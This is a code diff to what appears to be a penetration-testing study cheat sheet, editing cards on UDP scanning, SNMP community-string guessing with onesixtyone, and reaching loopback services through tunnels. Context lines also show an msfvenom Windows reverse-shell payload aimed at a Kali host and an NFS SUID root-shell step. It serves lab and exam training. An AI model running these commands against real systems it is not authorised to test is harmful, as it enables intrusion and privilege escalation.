@@ -74,13 +74,13 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell
     id: "recon-udp",
     section: "Recon",
     title: "UDP that matters",
-    look: "SNMP, TFTP, NTP, and sometimes DNS hide on UDP. A full UDP scan of 65535 is how you lose the morning. Top ports is the exam version.",
-    cmd: `nmap -sU --top-ports 20 -T4 <ip> -oN udp.txt
-# if 161 is open|filtered, still try the community
+    look: "SNMP, TFTP, NTP, IKE, and sometimes DNS only exist on UDP. Run top 20 on every host after the TCP passes. A reply is worth one service card. A full UDP scan of 65535 is how you lose the morning.",
+    cmd: `sudo nmap -Pn -sU --top-ports 20 -T4 -oA scans/udp <ip>
+# 161 often says open|filtered. That still deserves one community-string check.
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <ip>`,
-    alive: "161 replies to public, or 69 accepts a get. NTP and a closed 53 are not a shell.",
-    dead: "open|filtered on everything and onesixtyone is silent. UDP is done.",
-    next: "SNMP card if public works. Otherwise leave UDP.",
+    alive: "161 replies to public, or 69 accepts a get. NTP by itself, or a closed 53, is not a shell.",
+    dead: "open|filtered on everything and onesixtyone is silent. UDP is done. Do not escalate to all 65535 ports.",
+    next: "If nmap only says open|filtered, run Cisco's UDP protocol scanner on the Recon page. A named reply there is a service. Silence is the same dead end. SNMP still gets one community-string check when 161 is the interesting line.",
   },
   {
     id: "recon-hosts",
@@ -529,7 +529,7 @@ chmod +s /mnt/nfs/rootbash`,
 127.0.0.1:8080
 127.0.0.1:5005`,
     dead: "Only 0.0.0.0 ports you already scanned, plus sshd.",
-    next: "Talk to it locally: mysql, curl 127.0.0.1:8080, or note 5005 as Java debug. If the page is the real admin app, that is the foothold you missed.",
+    next: "From this shell, curl 127.0.0.1 is enough. If the tool you need is on Kali, use the tunnel builder's victim loopback. Do not point proxychains at 127.0.0.1. That address is Kali.",
   },
   {
     id: "lin-jdebug",
